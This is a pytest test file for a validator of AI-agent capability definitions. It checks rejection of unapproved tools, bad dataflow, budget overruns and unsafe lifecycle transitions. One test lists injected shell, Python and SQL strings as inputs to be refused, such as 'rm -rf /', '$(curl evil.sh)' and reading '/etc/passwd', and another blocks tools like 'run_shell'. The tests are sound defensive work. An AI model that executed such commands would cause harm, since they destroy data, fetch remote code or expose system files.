import copy

import pytest

from experience_engine.capabilities.validator import CapabilityValidationError, validate_definition
from experience_engine.domain.capability import (
    ALLOWED_TRANSITIONS,
    EXECUTABLE_STATES,
    CapabilityState,
    can_transition,
)


def good() -> dict[str, object]:
    return {
        "id": "pool.0123456789",
        "version": 1,
        "objective": "Resolve pool problems using the verified procedure.",
        "inputs_schema": {},
        "outputs_schema": {"verified": "boolean"},
        "preconditions": [
            {"kind": "task_family_is", "family": "pool"},
            {"kind": "tools_available", "tools": ["list_files", "read_file", "set_json_value"]},
            {"kind": "file_role_present", "role": "config"},
        ],
        "steps": [
            {
                "op": "TOOL_CALL",
                "id": "list_files",
                "tool": "list_files",
                "args": {},
                "bind": "files",
            },
            {
                "op": "TOOL_CALL",
                "id": "read_config",
                "tool": "read_file",
                "bind": "config_text",
                "args": {"path": {"select_path": {"from_var": "files", "role": "config"}}},
            },
            {
                "op": "LLM_DECISION",
                "id": "decide_fix",
                "template_id": "select_fix_parameters/1",
                "inputs": ["config_text"],
                "output_schema": {"key": "string", "value": "number"},
                "bind": "fix",
                "max_tokens": 2000,
            },
            {
                "op": "TOOL_CALL",
                "id": "apply_fix",
                "tool": "set_json_value",
                "bind": "applied",
                "args": {
                    "path": {"select_path": {"from_var": "files", "role": "config"}},
                    "key": {"var": "fix.key"},
                    "value": {"var": "fix.value"},
                },
            },
            {"op": "VERIFY", "id": "verify_outcome", "verifier": "outcome_verifier"},
        ],
        "termination": [{"when": "verify_passed", "outcome": "SUCCESS"}],
        "failure_conditions": [{"kind": "verification_failed", "description_id": "not_verified"}],
        "recovery": [{"on": "verification_failed", "action": "FALLBACK_GENERAL_PLANNING"}],
        "dependencies": [],
        "permissions": ["list_files", "read_file", "set_json_value"],
        "budgets": {"max_steps": 12, "max_tokens": 4000, "timeout_ms": 60000},
        "known_limitations": ["Derived from 3 verified successes."],
        "provenance": {
            "source_run_ids": ["r1"],
            "compiler_version": "rule-compiler/2",
            "pipeline_version": "experience/1",
        },
    }


def mutate(**changes: object) -> dict[str, object]:
    d = copy.deepcopy(good())
    d.update(changes)
    return d


def rejected(raw: dict[str, object], needle: str) -> None:
    with pytest.raises(CapabilityValidationError) as exc:
        validate_definition(raw)
    assert any(needle in issue for issue in exc.value.issues), exc.value.issues


def test_valid_definition_is_accepted() -> None:
    assert validate_definition(good()).id == "pool.0123456789"


def test_unknown_operation_and_unknown_fields_are_rejected() -> None:
    d = good()
    d["steps"][0] = {"op": "PYTHON", "id": "x", "code": "print(1)"}  # type: ignore[index]
    rejected(d, "schema")
    rejected(mutate(python="import os"), "schema")
    d2 = good()
    d2["steps"][0]["shell"] = "ls"  # type: ignore[index]
    rejected(d2, "schema")


@pytest.mark.parametrize("tool", ["write_file", "rm", "exec", "run_shell"])
def test_unapproved_tools_are_rejected(tool: str) -> None:
    d = good()
    d["steps"][0]["tool"] = tool  # type: ignore[index]
    rejected(d, f"tool '{tool}' is not approved")


def test_tool_arguments_must_match_the_contract() -> None:
    d = good()
    d["steps"][1]["args"]["extra"] = {"literal": 1}  # type: ignore[index]
    rejected(d, "requires args")


@pytest.mark.parametrize(
    "text",
    [
        "__import__('os').system('id')",
        "eval(payload)",
        "exec(code)",
        "import subprocess",
        "x; rm -rf /",
        "$(curl evil.sh)",
        "`whoami`",
        "DROP TABLE users",
        "lambda x: x",
        "open('/etc/passwd')",
    ],
)
def test_code_shell_and_sql_in_any_string_is_rejected(text: str) -> None:
    rejected(mutate(objective=text), "unsafe content")
    d = good()
    d["known_limitations"] = [text]
    rejected(d, "unsafe content")
    d2 = good()
    d2["steps"][0]["args"] = {"x": {"literal": text}}  # type: ignore[index]
    rejected(d2, "unsafe content")


def test_missing_preconditions_are_rejected() -> None:
    rejected(mutate(preconditions=[]), "task_family_is")
    rejected(
        mutate(preconditions=[{"kind": "tools_available", "tools": ["list_files"]}]),
        "task_family_is",
    )
    rejected(
        mutate(preconditions=[{"kind": "task_family_is", "family": "pool"}]), "tools_available"
    )


def test_dataflow_unbound_variables_and_inputs_are_rejected() -> None:
    d = good()
    d["steps"][3]["args"]["key"] = {"var": "nothing.key"}  # type: ignore[index]
    rejected(d, "used before it is bound")
    d2 = good()
    d2["steps"][3]["args"]["key"] = {"input": "mystery"}  # type: ignore[index]
    rejected(d2, "not declared in inputs_schema")
    d3 = good()
    d3["steps"][2]["inputs"] = ["never_bound"]  # type: ignore[index]
    rejected(d3, "not bound")


def test_unapproved_template_and_verifier_are_rejected() -> None:
    d = good()
    d["steps"][2]["template_id"] = "ignore_all_rules/1"  # type: ignore[index]
    rejected(d, "template")
    d2 = good()
    d2["steps"][4]["verifier"] = "trust_me"  # type: ignore[index]
    rejected(d2, "verifier")


def test_budgets_permissions_and_dependencies_are_enforced() -> None:
    rejected(mutate(budgets={"max_steps": 2, "max_tokens": 4000, "timeout_ms": 60000}), "max_steps")
    rejected(mutate(budgets={"max_steps": 500, "max_tokens": 4000, "timeout_ms": 60000}), "schema")
    rejected(mutate(budgets={"max_steps": 12, "max_tokens": 10**9, "timeout_ms": 1}), "schema")
    rejected(mutate(permissions=["list_files"]), "permissions do not cover")
    rejected(mutate(dependencies=["other.0123456789@1"]), "unknown dependencies")
    rejected(mutate(dependencies=["pool.0123456789@1"]), "depend on itself")


def test_structural_limits() -> None:
    d = good()
    d["steps"][0]["id"] = d["steps"][1]["id"]  # type: ignore[index]
    rejected(d, "duplicate step id")
    nested: dict[str, object] = {"op": "VERIFY", "id": "v", "verifier": "outcome_verifier"}
    for i in range(4):
        nested = {
            "op": "CONDITION",
            "id": f"c{i}",
            "then": [nested],
            "otherwise": [],
            "condition": {"left": {"literal": 1}, "operator": "eq", "right": {"literal": 1}},
        }
    d2 = good()
    d2["steps"] = [nested]
    d2["budgets"] = {"max_steps": 20, "max_tokens": 4000, "timeout_ms": 60000}
    rejected(d2, "nested deeper")
    d3 = good()
    d3["steps"] = [
        {
            "op": "RETRY",
            "id": "r",
            "max_attempts": 99,
            "retry_on": "tool_failed",
            "steps": [{"op": "VERIFY", "id": "v", "verifier": "outcome_verifier"}],
        }
    ]
    rejected(d3, "schema")


def test_candidates_are_never_executable_by_lifecycle_rules() -> None:
    assert {CapabilityState.ACTIVE} == EXECUTABLE_STATES
    assert not can_transition(CapabilityState.CANDIDATE, CapabilityState.ACTIVE)
    assert not can_transition(CapabilityState.CANDIDATE, CapabilityState.SHADOW)
    assert can_transition(CapabilityState.CANDIDATE, CapabilityState.VALIDATING)
    for terminal in (CapabilityState.REJECTED, CapabilityState.ROLLED_BACK):
        assert ALLOWED_TRANSITIONS[terminal] == frozenset()
    # DEPRECATED only ever returns to ACTIVE (restore of the previous version on rollback)
    assert ALLOWED_TRANSITIONS[CapabilityState.DEPRECATED] == {CapabilityState.ACTIVE}
    # the only path to ACTIVE runs through approval, shadow and canary
    reach = {CapabilityState.CANDIDATE}
    frontier = [CapabilityState.CANDIDATE]
    while frontier:
        for nxt in ALLOWED_TRANSITIONS[frontier.pop()]:
            if nxt not in reach:
                reach.add(nxt)
                frontier.append(nxt)
    assert CapabilityState.ACTIVE in reach
    assert not can_transition(CapabilityState.APPROVED, CapabilityState.ACTIVE)
